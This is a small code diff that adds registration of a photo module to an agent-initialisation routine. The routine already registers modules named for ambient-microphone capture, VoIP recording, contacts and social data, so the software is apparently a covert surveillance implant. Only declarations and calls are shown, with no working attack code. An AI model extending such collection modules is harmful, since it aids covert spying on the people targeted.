@@ -50,6 +50,7 @@ extern void PM_ApplicationRegister();
 extern void PM_PDAAgentRegister();
 extern void PM_ContactsRegister();
 extern void PM_SocialAgentRegister();
+extern void PM_PhotoRegister();
 
 typedef void (WINAPI *conf_callback_t)(JSONObject, DWORD counter);
 extern BOOL HM_ParseConfSection(char *conf, WCHAR *section, conf_callback_t call_back);
@@ -430,6 +431,7 @@ void InitAgents()
 	PM_ContactsRegister();
 	PM_AmbMicRegister();
 	PM_SocialAgentRegister();
+	PM_PhotoRegister();
 	PM_VoipRecordRegister(); // ma teniamolo per ultimo va, cosi' lo stoppa per ultimo
 }
 
